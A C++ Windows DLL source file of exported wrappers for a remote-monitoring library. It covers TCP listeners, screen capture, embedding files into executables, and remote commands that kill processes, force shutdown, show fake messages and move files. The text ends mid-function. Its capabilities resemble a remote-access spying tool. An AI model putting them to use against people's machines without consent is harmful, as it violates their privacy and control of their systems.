
/*----------------Generic headers-----------*/

#include "stdafx.h"
#include <TCHAR.H>
#include <Shlobj.h>
#include <Shellapi.h>

/*----------------Extra headers-----------*/

#include "GenericExtendedQueue.h"
#include "NetworkDatatypes.h"
#include "NetworkHeaderFormats.h"

#include "GenericNetwork.h"
#include "TcpNetworkMonitorDataSocket.h"
#include "TcpNetworkMonitorListener.h"
#include "GenericUtility.h"
#include "WinMonitorXmlUtility.h"
#include "exeExtraEditor.h"

#include "LzssCompression.h"

#include "GenericCommandMonitorUtility.h"
#include "CommandMonitorClient.h"
#include "CommandMonitorSupports.h"
#include "ScreenMonitor.h"
#include "WinMonitorRequester.h"

#include "CTString.h"

#include "WinMonitorVC++Library.1.0.h"

/*----------------DLL Main-----------*/

bool APIENTRY DllMain( HANDLE hMod,DWORD  reason4call,LPVOID lpReserved)
{
	 switch (reason4call)
	 {
			case DLL_PROCESS_ATTACH:
			case DLL_THREAD_ATTACH:
			case DLL_THREAD_DETACH:
			case DLL_PROCESS_DETACH:
			break;
	 }
    return true;
}

/*-----------------Required Mutexes----------*/

HANDLE m_MuxXmlUtility=CreateMutex(0,0,0); 
HANDLE m_MuxNwListener=CreateMutex(0,0,0); 
HANDLE m_MuxNwConnection=CreateMutex(0,0,0); 
HANDLE m_MuxScreenMonitor=CreateMutex(0,0,0); 
HANDLE m_MuxExeEditor=CreateMutex(0,0,0); 
HANDLE m_MuxCommandMonitorClient=CreateMutex(0,0,0); 
HANDLE m_MuxFileMonitor=CreateMutex(0,0,0); 
HANDLE m_MuxScreenMonitorMessenger=CreateMutex(0,0,0); 
HANDLE m_MuxWinMonitorMessenger=CreateMutex(0,0,0); 
HANDLE m_MuxMainMemoryMonitor=CreateMutex(0,0,0); 
HANDLE m_MuxOSMonitor=CreateMutex(0,0,0); 
HANDLE m_MuxChatClient=CreateMutex(0,0,0);

/*-----------Generic Network Functions--------*/

int  GenericNetworkLastError(void)
{
	 return (int)CInitializeNetworkLibrary::LastError();  
}

int LoadNetworkLibraryAndVersion(void)
{
	 return CInitializeNetworkLibrary::LoadLibraryAndVersion(); 
}

int CleanUpNetworkLibrary(void)
{
	 return CInitializeNetworkLibrary::CleanUpLibrary(); 
}

/*-----------Network Listening Functions--------*/

UINT64  RegisterListenerUser(CTcpNwMonitorListener *m_ptrToListener) 
{
	return (UINT64 ) m_ptrToListener;
}

UINT64  RegisterAsNwListenerUser(void)
{
	 WaitForSingleObject(m_MuxNwListener,INFINITE); 
		CTcpNwMonitorListener *m_ptrToListener=new CTcpNwMonitorListener(); 
	 ReleaseMutex(m_MuxNwListener);
	 return RegisterListenerUser(m_ptrToListener);
}

UINT64  RegisterAsNwListenerUserExx(int LocalHost,UINT Port)
{
	 WaitForSingleObject(m_MuxNwListener,INFINITE);  
		CTcpNwMonitorListener *m_ptrToListener=new CTcpNwMonitorListener((bool)LocalHost,Port); 
	 ReleaseMutex(m_MuxNwListener);
	 return RegisterListenerUser(m_ptrToListener);

}

UINT64  RegisterAsNwListenerUserEx(TCHAR *IP,UINT Port)
{
	 WaitForSingleObject(m_MuxNwListener,INFINITE);  
		CTcpNwMonitorListener *m_ptrToListener=new CTcpNwMonitorListener(IP,Port); 
	 ReleaseMutex(m_MuxNwListener);
	 return RegisterListenerUser(m_ptrToListener);
}

int RemoveNwListenerUser(UINT64  Address)
{
	 try
	 {
			WaitForSingleObject(m_MuxNwListener,INFINITE); 
			try
			{
				 CTcpNwMonitorListener *m_ptrToListener=(CTcpNwMonitorListener*)Address; 
				 if(m_ptrToListener) try { delete m_ptrToListener; } catch(...) {}
			}
            catch(...) {}
			ReleaseMutex(m_MuxNwListener);
			return 1;
	 }
	 catch(...) { return 0;	 }
}

CTcpNwMonitorListener *GetTcpNwListenerByAddress(UINT64  Address)
{
	 try
	 {
			WaitForSingleObject(m_MuxNwListener,INFINITE);   
				 CTcpNwMonitorListener *m_ptrToTcpNwListener=(CTcpNwMonitorListener*)Address; 
			ReleaseMutex(m_MuxNwListener);
		  return m_ptrToTcpNwListener;
	 }
	 catch(...) { return 0; }
}

int SetListenState(UINT64  Address,int On)
{
	 CTcpNwMonitorListener *m_ptrToTcpNwListener=GetTcpNwListenerByAddress(Address);
	 if(m_ptrToTcpNwListener) return m_ptrToTcpNwListener->SetListenState((bool)On); 
	 else return 0;
}

int DisconnectListenConnection(UINT64  Address)
{
	 CTcpNwMonitorListener *m_ptrToTcpNwListener=GetTcpNwListenerByAddress(Address);
	 if(m_ptrToTcpNwListener) return m_ptrToTcpNwListener->DisconnectListenConnection(); 
	 else return 0;
}

int ListenAt(UINT64  Address,TCHAR *IpAddress,UINT Port)
{
	 CTcpNwMonitorListener *m_ptrToTcpNwListener=GetTcpNwListenerByAddress(Address);
	 if(m_ptrToTcpNwListener) return m_ptrToTcpNwListener->ListenAt(IpAddress,Port);
	 else return 0;
}

int ListenAtEx(UINT64  Address,int LocalHost,UINT Port)
{
	 CTcpNwMonitorListener *m_ptrToTcpNwListener=GetTcpNwListenerByAddress(Address);
	 if(m_ptrToTcpNwListener) return m_ptrToTcpNwListener->ListenAt(LocalHost,Port);
	 else return 0;
}

int GetListenFlag(UINT64  Address)
{
	 CTcpNwMonitorListener *m_ptrToTcpNwListener=GetTcpNwListenerByAddress(Address);
	 if(m_ptrToTcpNwListener) return m_ptrToTcpNwListener->GetListenFlag(); 
	 else return 0;
}

int RetrieveClient(UINT64  Address,UINT64 &ClientConnectionAddress)
{
	 CTcpNwMonitorListener *m_ptrToTcpNwListener=GetTcpNwListenerByAddress(Address);
	 if(!m_ptrToTcpNwListener) return 0;
	 CTcpNwMonitorConnection *m_ptrToConnection=(CTcpNwMonitorConnection*)RegisterAsNwConnectionUser();
	 if(!m_ptrToConnection) return 0;
	 int boolIsRetrieved=m_ptrToTcpNwListener->RetrieveClient(*m_ptrToConnection);
	 ClientConnectionAddress=(UINT64)m_ptrToConnection;
	 return boolIsRetrieved;
}

int RemoveClient(UINT64  Address,UINT64 &ClientConnectionAddress)
{
	 CTcpNwMonitorListener *m_ptrToTcpNwListener=GetTcpNwListenerByAddress(Address);
	 if(!m_ptrToTcpNwListener) return 0;
	 CTcpNwMonitorConnection *m_ptrToConnection=(CTcpNwMonitorConnection*)RegisterAsNwConnectionUser();
	 if(!m_ptrToConnection) return 0;
	 int boolIsRetrieved=m_ptrToTcpNwListener->RemoveClient(*m_ptrToConnection);
	 ClientConnectionAddress=(UINT64)m_ptrToConnection;
	 return boolIsRetrieved;
}

int  ListenLastError(UINT64  Address)
{
	 CTcpNwMonitorListener *m_ptrToTcpNwListener=GetTcpNwListenerByAddress(Address);
	 if(!m_ptrToTcpNwListener) return -1;
	 return (int)(m_ptrToTcpNwListener->LastError());
}


/*-----------Network Connecting  Functions--------*/

UINT64  RegisterConnectionUser(CTcpNwMonitorConnection *m_ptrToConnection) 
{
	return (UINT64 ) m_ptrToConnection;
}

UINT64  RegisterAsNwConnectionUser(void)
{
	 WaitForSingleObject(m_MuxNwConnection,INFINITE);  
		CTcpNwMonitorConnection *m_ptrToConnection=new CTcpNwMonitorConnection();
	 ReleaseMutex(m_MuxNwConnection);
	 return RegisterConnectionUser(m_ptrToConnection);
}

int RemoveNwConnectionUser(UINT64  Address)
{
	 try
	 {
			WaitForSingleObject(m_MuxNwConnection,INFINITE);  
			try
			{
				 CTcpNwMonitorConnection *m_ptrToConnection=(CTcpNwMonitorConnection*)Address; 
				 if(m_ptrToConnection) try {	delete m_ptrToConnection;  } catch(...) {}
	        }
            catch(...) {}
			ReleaseMutex(m_MuxNwConnection);
			return 1;
	 }
	 catch(...) { return 0;	 }
}

CTcpNwMonitorConnection *GetTcpNwConnectionByAddress(UINT64  Address)
{
	 try
	 {
			WaitForSingleObject(m_MuxNwConnection,INFINITE);   
				 CTcpNwMonitorConnection *m_ptrToTcpConnection=(CTcpNwMonitorConnection*)Address; 
			ReleaseMutex(m_MuxNwConnection);
		  return m_ptrToTcpConnection;
	 }
	 catch(...) { return 0; }
}

int  ConnectionLastError(UINT64  Address)
{
	 CTcpNwMonitorConnection *m_ptrToTcpConnection=GetTcpNwConnectionByAddress(Address);
	 if(!m_ptrToTcpConnection) return -1;
	 return (int)(m_ptrToTcpConnection->LastError());
}

int ConnectTo(UINT64  Address,TCHAR *ServerIP,UINT ServerPort)
{
	 CTcpNwMonitorConnection *m_ptrToTcpConnection=GetTcpNwConnectionByAddress(Address);
	 if(m_ptrToTcpConnection) return m_ptrToTcpConnection->ConnectTo(ServerIP,ServerPort) ;
	 else return 0;
}

int GetIPandPort(UINT64  Address,int OfRemoteHost,TCHAR *IP,UINT32 &Port)
{
	 CTcpNwMonitorConnection *m_ptrToTcpConnection=GetTcpNwConnectionByAddress(Address);
	 if(m_ptrToTcpConnection) return m_ptrToTcpConnection->GetIPandPort((bool)OfRemoteHost,IP,Port);
	 else return 0;
}

int SendByteStream(UINT64  Address,char *MessageBuffer,UINT32 NumberOfBytesToSend,UINT32 &NumberOfBytesSended)
{
	 CTcpNwMonitorConnection *m_ptrToTcpConnection=GetTcpNwConnectionByAddress(Address);
	 if(m_ptrToTcpConnection) return m_ptrToTcpConnection->SendByteStream(MessageBuffer,NumberOfBytesToSend,NumberOfBytesSended);
	 else return 0;
}

int ReceiveByteStream(UINT64  Address,char *MessageBuffer,UINT32 NumberOfBytesToReceive,UINT32 &NumberOfBytesReceived)
{
	 CTcpNwMonitorConnection *m_ptrToTcpConnection=GetTcpNwConnectionByAddress(Address);
	 if(m_ptrToTcpConnection) return m_ptrToTcpConnection->ReceiveByteStream(MessageBuffer,NumberOfBytesToReceive,NumberOfBytesReceived);
	 else return 0;
}

int Disconnect(UINT64  Address)
{
	 CTcpNwMonitorConnection *m_ptrToTcpConnection=GetTcpNwConnectionByAddress(Address);
	 if(m_ptrToTcpConnection) return m_ptrToTcpConnection->Disconnect(); 
	 else return 0;
}


/*-----------XML utility Functions--------*/

UINT64  RegisterXmlUtilityUser(IXmlUtility *m_ptrToxmlUtility) 
{
	return (UINT64 ) m_ptrToxmlUtility;
}

UINT64  RegisterAsXmlUtilityUser(void)
{
	 IXmlUtility *m_ptrToxmlUtility;
	 WaitForSingleObject(m_MuxXmlUtility,INFINITE);   
		try{Create_IXmlUtility(&m_ptrToxmlUtility);}catch(...){}
	 ReleaseMutex(m_MuxXmlUtility);
	 return RegisterXmlUtilityUser(m_ptrToxmlUtility);
}

int RemoveXmlUtilityUser(UINT64  Address)
{
	 try
	 {
			WaitForSingleObject(m_MuxXmlUtility,INFINITE);   
			try
			{
				 IXmlUtility *m_ptrToxmlUtility=(IXmlUtility*)Address; 
				 if(m_ptrToxmlUtility) try{Delete_IXmlUtility(&m_ptrToxmlUtility);} catch(...){}
			}
	        catch(...) {}
			ReleaseMutex(m_MuxXmlUtility);
			return 1;
	 }
	 catch(...) { return 0;	 }
}

IXmlUtility *GetIXmlUtilityByAddress(UINT64  Address)
{
	 try
	 {
			WaitForSingleObject(m_MuxXmlUtility,INFINITE);   
				 IXmlUtility *m_ptrToxmlUtility=(IXmlUtility*)Address; 
			ReleaseMutex(m_MuxXmlUtility);
		  return m_ptrToxmlUtility;
	 }
	 catch(...) { return 0; }
}

int SetTokenSeperatorX(UINT64  Address,TCHAR *TokenSeperator)
{	
	 IXmlUtility *m_ptrToxmlUtility=GetIXmlUtilityByAddress(Address);
	 if(m_ptrToxmlUtility) return (int)m_ptrToxmlUtility->SetTokenSeperator(TokenSeperator); 
	 else return (int)0;
}

int CreateNewXmlDocumentX(UINT64  Address,TCHAR* NewXML_FullFileName,TCHAR *RootNodeName)
{			
	 _bstr_t bstrNewXML_FileName=NewXML_FullFileName;
	 IXmlUtility *m_ptrToxmlUtility=GetIXmlUtilityByAddress(Address);
	 if(m_ptrToxmlUtility) return (int)m_ptrToxmlUtility->CreateNewXmlDocument(bstrNewXML_FileName,RootNodeName); 
	 else return (int)0;
}

int  OpenXmlDocumentX(UINT64  Address,TCHAR* XmlFullFileName)
{			
	 _bstr_t bstrFullFileName=XmlFullFileName;
	 IXmlUtility *m_ptrToxmlUtility=GetIXmlUtilityByAddress(Address);
	 if(m_ptrToxmlUtility) return (int)m_ptrToxmlUtility->OpenXmlDocument(bstrFullFileName);  
	 else return (int)0;
}

int  GetNodeTextFromHeirarchyX(UINT64  Address,TCHAR *Heirarchy,TCHAR* NodeText,int BeginAtRoot)
{	
	 IXmlUtility *m_ptrToxmlUtility=GetIXmlUtilityByAddress(Address);
	 if(m_ptrToxmlUtility) return (int)m_ptrToxmlUtility->GetNodeTextFromHeirarchy(Heirarchy,NodeText,(bool)BeginAtRoot); 
	 else return (int)0;
}

int  GetNodeAttributeFromHeirarchyX(UINT64  Address,TCHAR *Heirarchy,TCHAR *AttributeName,TCHAR* AttributeValue,int BeginAtRoot)
{			
	 IXmlUtility *m_ptrToxmlUtility=GetIXmlUtilityByAddress(Address);
	 if(m_ptrToxmlUtility) return (int)m_ptrToxmlUtility->GetNodeAttributeFromHeirarchy(Heirarchy,AttributeName,AttributeValue,(bool)BeginAtRoot);  
	 else return (int)0;
}

int  SetTextIntoHeirarchyX(UINT64  Address,TCHAR *Heirarchy,TCHAR *Text,int BeginAtRoot)
{	
	 IXmlUtility *m_ptrToxmlUtility=GetIXmlUtilityByAddress(Address);
	 if(m_ptrToxmlUtility) return (int)m_ptrToxmlUtility->SetTextIntoHeirarchy(Heirarchy,Text,(bool)BeginAtRoot);  
	 else return (int)0;
}

int  SetNodeTextIntoHeirarchyX(UINT64  Address,TCHAR *Heirarchy,TCHAR *NodeToBeCreated,TCHAR *NodeValue,int BeginAtRoot)
{	
	 IXmlUtility *m_ptrToxmlUtility=GetIXmlUtilityByAddress(Address);
	 if(m_ptrToxmlUtility) return (int)m_ptrToxmlUtility->SetNodeTextIntoHeirarchy(Heirarchy,NodeToBeCreated,NodeValue,(bool)BeginAtRoot); 
	 else return (int)0;
}

int  SetNodeAttributeIntoHeirarchyX(UINT64  Address,TCHAR *Heirarchy,TCHAR *AttributeToBeCreated,TCHAR *AttributeValue,int BeginAtRoot)
{	
	 IXmlUtility *m_ptrToxmlUtility=GetIXmlUtilityByAddress(Address);
	 if(m_ptrToxmlUtility) return (int)m_ptrToxmlUtility->SetNodeAttributeIntoHeirarchy(Heirarchy,AttributeToBeCreated,AttributeValue,(bool)BeginAtRoot);  
	 else return (int)0;
}

int  InsertAllNodesFromX(UINT64  Address,TCHAR* XML_FileToBeMerged,int InsertAtRoot)
{	 
	 _bstr_t bstrXMLfileToBeMerged=XML_FileToBeMerged;
	 IXmlUtility *m_ptrToxmlUtility=GetIXmlUtilityByAddress(Address);
	 if(m_ptrToxmlUtility) return (int)m_ptrToxmlUtility->InsertAllNodesFrom(bstrXMLfileToBeMerged,(bool)InsertAtRoot); 
	 else return (int)0;

}
	 
int  InsertSelectedNodesFromX(UINT64  Address,UINT64  AddressToBeCopied,int InsertAtRoot)
{	
	 IXmlUtility *m_ptrToxmlUtility=GetIXmlUtilityByAddress(Address);
	 IXmlUtility *m_ptrToxmlUtilityToBeCopied=GetIXmlUtilityByAddress(AddressToBeCopied);
	 if(m_ptrToxmlUtility && m_ptrToxmlUtilityToBeCopied) 
			return (int)m_ptrToxmlUtility->InsertSelectedNodesFrom(m_ptrToxmlUtilityToBeCopied,(bool)InsertAtRoot);  
	 else return 0;
} 

int  MoveToChildByIndexX(UINT64  Address,TCHAR *ParentNodeHeirarchy,long ChildIndex,int BeginAtRoot)
{	
	 IXmlUtility *m_ptrToxmlUtility=GetIXmlUtilityByAddress(Address);
	 if(m_ptrToxmlUtility) return (int)m_ptrToxmlUtility->MoveToChild(ParentNodeHeirarchy,ChildIndex,(bool)BeginAtRoot);  
	 else return 0;
}

int  MoveToChildByNameX(UINT64  Address,TCHAR *ParentNodeHeirarchy,TCHAR *ChildName,int BeginAtRoot)
{
	 IXmlUtility *m_ptrToxmlUtility=GetIXmlUtilityByAddress(Address);
	 if(m_ptrToxmlUtility) return (int)m_ptrToxmlUtility->MoveToChild(ParentNodeHeirarchy,ChildName,(bool)BeginAtRoot);  
	 else return 0;
}

int  MoveToBrotherX(UINT64  Address,int Older)
{
	 IXmlUtility *m_ptrToxmlUtility=GetIXmlUtilityByAddress(Address);
	 if(m_ptrToxmlUtility) return (int)m_ptrToxmlUtility->MoveToBrother((bool)Older); 
	 else return 0;
}

int MoveToParentX(UINT64  Address)
{
	 IXmlUtility *m_ptrToxmlUtility=GetIXmlUtilityByAddress(Address);
	 if(m_ptrToxmlUtility) return (int)m_ptrToxmlUtility->MoveToParent();  
	 else return 0;
}


int  ResetSearchPointerToRootX(UINT64  Address)
{
	 IXmlUtility *m_ptrToxmlUtility=GetIXmlUtilityByAddress(Address);
	 if(m_ptrToxmlUtility) return (int)m_ptrToxmlUtility->ResetSearchPointerToRoot();  
	 else return 0;
}

long  NumberOfBrothersX(UINT64  Address)
{
	 IXmlUtility *m_ptrToxmlUtility=GetIXmlUtilityByAddress(Address);
	 if(m_ptrToxmlUtility) return m_ptrToxmlUtility->NumberOfBrothers();  
	 else return 0;
}

long  NumberOfChildrenX(UINT64  Address,int OfRootNode)
{
	 IXmlUtility *m_ptrToxmlUtility=GetIXmlUtilityByAddress(Address);
	 if(m_ptrToxmlUtility) return m_ptrToxmlUtility->NumberOfChildren((bool)OfRootNode); 
	 else return 0;
}

int  GetNodeNameX(UINT64  Address,TCHAR* NodeName,int OfRootNode)
{
	 IXmlUtility *m_ptrToxmlUtility=GetIXmlUtilityByAddress(Address);
	 if(m_ptrToxmlUtility) return (int)m_ptrToxmlUtility->GetNodeName(NodeName,(bool)OfRootNode); 
	 else return 0;
}

int SetForceCreateX(UINT64  Address,int MakeOnState)
{
	 IXmlUtility *m_ptrToxmlUtility=GetIXmlUtilityByAddress(Address);
	 if(m_ptrToxmlUtility) return (int)m_ptrToxmlUtility->SetForceCreate((bool)MakeOnState); 
	 else return 0;
}

TCHAR *GetErrorX(UINT64  Address)
{
	 IXmlUtility *m_ptrToxmlUtility=GetIXmlUtilityByAddress(Address);
	 if(m_ptrToxmlUtility) return m_ptrToxmlUtility->GetError();
	 else return 0;
} 


//----------------Screen Monitor user

UINT64  RegisterScreenMonitorUser(CScreenMonitorBase *m_ptrToSmonitor) 
{
	return (UINT64 ) m_ptrToSmonitor;
}

UINT64 RegisterAsScreenMonitorUser(BYTE Compression)
{
	WaitForSingleObject(m_MuxScreenMonitor,INFINITE);  
		CScreenMonitorBase *m_ptrToSmonitor=new CScreenMonitorBase(Compression); 
	ReleaseMutex(m_MuxScreenMonitor); 
	return RegisterScreenMonitorUser(m_ptrToSmonitor);
}

int RemoveScreenMonitorUser(UINT64  Address)
{
	 try
	 {
			WaitForSingleObject(m_MuxScreenMonitor,INFINITE); 
			try
			{
				 CScreenMonitorBase *m_ptrToSmonitor=(CScreenMonitorBase*)Address; 
				 if(m_ptrToSmonitor) try { delete m_ptrToSmonitor; } catch(...) {}
			}
		    catch(...) {}
			ReleaseMutex(m_MuxScreenMonitor);
			return 1;
	 }
    catch(...) { return 0;	 }
}

CScreenMonitorBase *GetScreenMonitorByAddress(UINT64  Address)
{
	 try
	 {
			WaitForSingleObject(m_MuxScreenMonitor,INFINITE);    
				 CScreenMonitorBase *m_ptrToSmonitor=(CScreenMonitorBase*)Address; 
			ReleaseMutex(m_MuxScreenMonitor);
		  return m_ptrToSmonitor;
	 }
	 catch(...) { return 0; }
}

int SetCompression(UINT64  Address,BYTE Compression)
{
	CScreenMonitorBase *m_ptrToSmonitor=GetScreenMonitorByAddress(Address);
	if(m_ptrToSmonitor) return m_ptrToSmonitor->SetCompression(Compression);
	else return false;
}

int SetType(UINT64  Address,BYTE TransferItemType)
{
	CScreenMonitorBase *m_ptrToSmonitor=GetScreenMonitorByAddress(Address);
	if(m_ptrToSmonitor) return m_ptrToSmonitor->SetType(TransferItemType);
	else return false;
}

int CaptureDesktopImage(UINT64  Address)
{
	CScreenMonitorBase *m_ptrToSmonitor=GetScreenMonitorByAddress(Address);
	if(m_ptrToSmonitor) return m_ptrToSmonitor->CaptureDesktopImage();
	else return false;
}

int CaptureWindowImage(UINT64  Address,HWND hWnd)
{
	CScreenMonitorBase *m_ptrToSmonitor=GetScreenMonitorByAddress(Address);
	if(m_ptrToSmonitor) return m_ptrToSmonitor->CaptureWindowImage(hWnd);
	else return false;
}

int SaveBitmapToFile(UINT64  Address,TCHAR *FileName,int IsCompress)
{
	CScreenMonitorBase *m_ptrToSmonitor=GetScreenMonitorByAddress(Address);
	if(m_ptrToSmonitor) return m_ptrToSmonitor->SaveBitmapToFile(FileName,IsCompress);
	else return false;
}

int ReplaceDesktopImage(UINT64  Address)
{
	CScreenMonitorBase *m_ptrToSmonitor=GetScreenMonitorByAddress(Address);
	if(m_ptrToSmonitor) return m_ptrToSmonitor->ReplaceDesktopImage();
	else return false;
}

int ReplaceWindowImage(UINT64  Address,HWND hWnd)
{
	CScreenMonitorBase *m_ptrToSmonitor=GetScreenMonitorByAddress(Address);
	if(m_ptrToSmonitor) return (int)m_ptrToSmonitor->ReplaceWindowImage(hWnd);
	else return false;
}

int LoadBitmapFromFile(UINT64  Address,TCHAR *FileName,int IsCompressed)
{
	CScreenMonitorBase *m_ptrToSmonitor=GetScreenMonitorByAddress(Address);
	if(m_ptrToSmonitor) return m_ptrToSmonitor->LoadBitmapFromFile(FileName,IsCompressed);
	else return false;
}

//--------------------Exe Editor functionss----------------//

UINT64 RegisterExeEditor(CexeExtraEditor *ptrToExeEditor)
{
	return (UINT64 ) ptrToExeEditor;
}

int RemoveExeEditor(UINT64  Address)
{
	 try
	 {
			WaitForSingleObject(m_MuxExeEditor,INFINITE); 
			try
			{
				 CexeExtraEditor  *m_ptrToExeEditor=(CexeExtraEditor*)Address; 
				 if(m_ptrToExeEditor) try {	delete m_ptrToExeEditor; } catch(...) {}
			}
			catch(...) {}
			ReleaseMutex(m_MuxExeEditor);
			return 1;
	 }
    catch(...) { return 0;	 }
}

CexeExtraEditor *GetExeEditorByAddress(UINT64  Address)
{
	 try
	 {
			WaitForSingleObject(m_MuxExeEditor,INFINITE);    
				 CexeExtraEditor  *m_ptrToExeEditor=(CexeExtraEditor*)Address; 
			ReleaseMutex(m_MuxExeEditor);
		  return m_ptrToExeEditor;
	 }
	 catch(...) { return 0; }
}

UINT64 RegisterAsExeEditor(void)
{
	CexeExtraEditor *ptrToExeEditor=new CexeExtraEditor();
	return RegisterExeEditor(ptrToExeEditor);
}

UINT64 RegisterAsExeEditorEx(TCHAR *exeNameWithFullPath)
{
	WaitForSingleObject(m_MuxExeEditor,INFINITE);    
		CexeExtraEditor *ptrToExeEditor=new CexeExtraEditor(exeNameWithFullPath);
	ReleaseMutex(m_MuxExeEditor);
	return RegisterExeEditor(ptrToExeEditor);
}

UINT64 RegisterAsExeEditorExx(TCHAR *exeNameWithFullPath,TCHAR *ResourceName,TCHAR *ResourceType)
{
	WaitForSingleObject(m_MuxExeEditor,INFINITE);    
		CexeExtraEditor *ptrToExeEditor=new CexeExtraEditor(exeNameWithFullPath,ResourceName,ResourceType);
	ReleaseMutex(m_MuxExeEditor);
	return RegisterExeEditor(ptrToExeEditor);
}

int ErrorFlag(UINT64  Address)
{
	CexeExtraEditor *m_ptrToExeEditor=GetExeEditorByAddress(Address);
	if(m_ptrToExeEditor) return m_ptrToExeEditor->ErrorFlag();
	else return -1;
}

int SetExeFileName(UINT64  Address,TCHAR *exeNameWithFullPath)
{
	CexeExtraEditor *m_ptrToExeEditor=GetExeEditorByAddress(Address);
	if(m_ptrToExeEditor) return m_ptrToExeEditor->SetExeFileName(exeNameWithFullPath);
	else return false;
}

int SetResourceInfo(UINT64  Address,TCHAR *ResourceName,TCHAR *ResourceType)
{
	CexeExtraEditor *m_ptrToExeEditor=GetExeEditorByAddress(Address);
	if(m_ptrToExeEditor) return m_ptrToExeEditor->SetResourceInfo(ResourceName,ResourceType);
	else return false;
}

int EmbedFileToexe(UINT64  Address,TCHAR *FileNamewithFullPath)
{
	CexeExtraEditor *m_ptrToExeEditor=GetExeEditorByAddress(Address);
	if(m_ptrToExeEditor) return m_ptrToExeEditor->EmbedFileToexe(FileNamewithFullPath);
	else return false;
}

int ExtractFileFromExe(UINT64  Address,TCHAR *FileNameWithExtnToSave)
{
	CexeExtraEditor *m_ptrToExeEditor=GetExeEditorByAddress(Address);
	if(m_ptrToExeEditor) return m_ptrToExeEditor->ExtractFileFromExe(FileNameWithExtnToSave);
	else return false;
}

//------------------Command Monitor Client-----------//

UINT64 RegisterCommandMonitorClient(CCommandMonitorClient *ptrToCommandMonitorClient)
{
	return (UINT64 ) ptrToCommandMonitorClient;
}

int RemoveCommandMonitorClient(UINT64  Address)
{
	 try
	 {
			WaitForSingleObject(m_MuxCommandMonitorClient,INFINITE); 
			try
			{
				 CCommandMonitorClient *ptrToCommandMonitorClient=(CCommandMonitorClient*)Address; 
				 if(ptrToCommandMonitorClient) try { delete ptrToCommandMonitorClient; } catch(...) {}
			}
			catch(...) {}
			ReleaseMutex(m_MuxCommandMonitorClient);
			return 1;
	 }
    catch(...) { return 0;	 }
}

CCommandMonitorClient *GetCommandMonitorClientByAddress(UINT64  Address)
{
	 try
	 {
			WaitForSingleObject(m_MuxCommandMonitorClient,INFINITE);    
				 CCommandMonitorClient *ptrToCommandMonitorClient=(CCommandMonitorClient*)Address; 
			ReleaseMutex(m_MuxCommandMonitorClient);
		  return ptrToCommandMonitorClient;
	 }
	 catch(...) { return 0; }
}

UINT64 RegisterAsCommandMonitorClient(UINT32 CommandType,TCHAR *CommandArgs,UINT32 Compression,TCHAR ResultSeperator)
{
	CCommandMonitorClient *ptrToCommandMonitorClient=new CCommandMonitorClient(CommandType,CommandArgs,Compression,ResultSeperator);
	return RegisterCommandMonitorClient(ptrToCommandMonitorClient);

}

UINT32 CMCGetResultantType(UINT64  Address)
{
	CCommandMonitorClient *ptrToCommandMonitorClient=GetCommandMonitorClientByAddress(Address);
	if(ptrToCommandMonitorClient) return ptrToCommandMonitorClient->GetResultantType();
	return 0;
}

int CMCSetCommand(UINT64  Address,UINT32 CommandType,TCHAR *CommandArgs)
{
	CCommandMonitorClient *ptrToCommandMonitorClient=GetCommandMonitorClientByAddress(Address);
	if(ptrToCommandMonitorClient) return ptrToCommandMonitorClient->SetCommand(CommandType,CommandArgs);
	return 0;
}

int CMCSetSystemDownMode(UINT64  Address,int ForceDown)
{
	CCommandMonitorClient *ptrToCommandMonitorClient=GetCommandMonitorClientByAddress(Address);
	if(ptrToCommandMonitorClient) return ptrToCommandMonitorClient->SetSystemDownMode(ForceDown==0?false:true);
	return 0;
}

int CMCSetFakeMessage(UINT64  Address,TCHAR *MsgTxt,TCHAR *MsgCap,BYTE MsgType)
{
	CCommandMonitorClient *ptrToCommandMonitorClient=GetCommandMonitorClientByAddress(Address);
	if(ptrToCommandMonitorClient) return ptrToCommandMonitorClient->SetFakeMessage(MsgTxt,MsgCap,MsgType);
	return 0;
}

int CMCSetProcessPriority(UINT64  Address,UINT32 ProcessID,BYTE PriorityLevel)
{
	CCommandMonitorClient *ptrToCommandMonitorClient=GetCommandMonitorClientByAddress(Address);
	if(ptrToCommandMonitorClient) return ptrToCommandMonitorClient->SetProcessPriority(ProcessID,PriorityLevel);
	return 0;
}

int CMCSetKillProcess(UINT64  Address,UINT32 ProcessID)
{
	CCommandMonitorClient *ptrToCommandMonitorClient=GetCommandMonitorClientByAddress(Address);
	if(ptrToCommandMonitorClient) return ptrToCommandMonitorClient->SetKillProcess(ProcessID);
	return 0;
}

int CMCSetFileUpLoad(UINT64  Address,TCHAR *SrcRoot,TCHAR *FileName,TCHAR *TarRoot)
{
	CCommandMonitorClient *ptrToCommandMonitorClient=GetCommandMonitorClientByAddress(Address);
	if(ptrToCommandMonitorClient) return ptrToCommandMonitorClient->SetFileUpLoad(SrcRoot,FileName,TarRoot);
	return 0;
}

int CMCSetCompression(UINT64  Address,UINT32 Compression)
{
	CCommandMonitorClient *ptrToCommandMonitorClient=GetCommandMonitorClientByAddress(Address);
	if(ptrToCommandMonitorClient) return ptrToCommandMonitorClient->SetCompression(Compression);
	return 0;
}

int CMCSetRemoteServerCompression(UINT64  Address,UINT32 uint32Compression)
{
	CCommandMonitorClient *ptrToCommandMonitorClient=GetCommandMonitorClientByAddress(Address);
	if(ptrToCommandMonitorClient) return ptrToCommandMonitorClient->SetRemoteServerCompression(uint32Compression);
	return 0;
}

int CMCSetTokenSeperator(UINT64  Address,TCHAR ResultSeperator)
{
	CCommandMonitorClient *ptrToCommandMonitorClient=GetCommandMonitorClientByAddress(Address);
	if(ptrToCommandMonitorClient) return ptrToCommandMonitorClient->SetTokenSeperator(ResultSeperator);
	return 0;
}

int CMCSaveRemoteFile(UINT64  Address,TCHAR *FileName,TCHAR *DstRootDirPath)
{
	CCommandMonitorClient *ptrToCommandMonitorClient=GetCommandMonitorClientByAddress(Address);
	if(ptrToCommandMonitorClient) return (int)(ptrToCommandMonitorClient->SaveRemoteFile(FileName,DstRootDirPath));
	return 0;
}

int CMCGetResult(UINT64  Address,BYTE *bytptrResult,UINT32 &ResultLength)
{
	CCommandMonitorClient *ptrToCommandMonitorClient=GetCommandMonitorClientByAddress(Address);
	if(ptrToCommandMonitorClient) return (int)(ptrToCommandMonitorClient->GetResult(bytptrResult,ResultLength));
	return 0;
}

//---------------------File Monitor Functions-------------//


UINT64 RegisterFileMonitor(CFileMonitor *ptrToFileMonitor)
{
	return (UINT64 ) ptrToFileMonitor;
}

UINT64 RegisterAsFileMonitor(void)
{
	WaitForSingleObject(m_MuxFileMonitor,INFINITE); 
		CFileMonitor *ptrToFileMonitor=new CFileMonitor();
	ReleaseMutex(m_MuxFileMonitor);
